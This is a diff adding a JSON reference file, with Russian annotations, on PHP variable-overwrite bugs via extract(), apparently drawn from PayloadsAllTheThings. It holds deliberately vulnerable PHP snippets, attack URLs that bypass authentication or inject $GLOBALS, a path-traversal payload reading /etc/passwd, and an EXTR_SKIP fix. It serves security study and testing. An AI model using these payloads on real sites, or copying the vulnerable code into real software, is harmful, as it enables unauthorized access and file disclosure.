@@ -1,0 +1,55 @@
+{
+  "category": "External Variable Modification",
+  "source": "PayloadsAllTheThings/External Variable Modification/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что это и где искать",
+      "language": "text",
+      "tags": ["php", "extract", "methodology"],
+      "body": "PHP-функции extract($_GET/$_POST), import_request_variables(), parse_str() и register_globals импортируют пользовательский ввод в текущие переменные.\nextract() по умолчанию EXTR_OVERWRITE → ПЕРЕЗАПИСЫВАЕТ существующие переменные с тем же именем.\nИмпакт: обход логики/аутентификации, гаджет для LFI и RCE. Ищи в исходниках extract($_GET) и подобное."
+    },
+    {
+      "subcategory": "Перезапись переменных",
+      "title": "Уязвимый код — обход аутентификации",
+      "language": "php",
+      "tags": ["php", "extract", "auth-bypass"],
+      "body": "<?php\n    $authenticated = false;\n    extract($_GET);\n    if ($authenticated) {\n        echo \"Access granted!\";\n    } else {\n        echo \"Access denied!\";\n    }\n?>"
+    },
+    {
+      "subcategory": "Перезапись переменных",
+      "title": "Эксплуатация — выставить $authenticated",
+      "language": "text",
+      "tags": ["php", "auth-bypass"],
+      "body": "http://example.com/vuln.php?authenticated=true\nhttp://example.com/vuln.php?authenticated=1"
+    },
+    {
+      "subcategory": "Poisoning File Inclusion",
+      "title": "Уязвимый код — управление путём include",
+      "language": "php",
+      "tags": ["php", "lfi", "extract"],
+      "body": "<?php\n    $page = \"config.php\";\n    extract($_GET);\n    include \"$page\";\n?>"
+    },
+    {
+      "subcategory": "Poisoning File Inclusion",
+      "title": "Эксплуатация — подмена $page на LFI",
+      "language": "text",
+      "tags": ["php", "lfi"],
+      "body": "http://example.com/vuln.php?page=../../etc/passwd"
+    },
+    {
+      "subcategory": "Global Variable Injection",
+      "title": "Перезапись $GLOBALS",
+      "language": "text",
+      "tags": ["php", "globals"],
+      "body": "В коде: extract($_GET);\n\nАтака:\nhttp://example.com/vuln.php?GLOBALS[admin]=1\n\nПрим.: с PHP 8.1.0 запись во весь массив $GLOBALS больше не поддерживается."
+    },
+    {
+      "subcategory": "Защита",
+      "title": "Защита — EXTR_SKIP",
+      "language": "php",
+      "tags": ["php", "remediation"],
+      "body": "extract($_GET, EXTR_SKIP); // не перезаписывать существующие переменные"
+    }
+  ]
+}
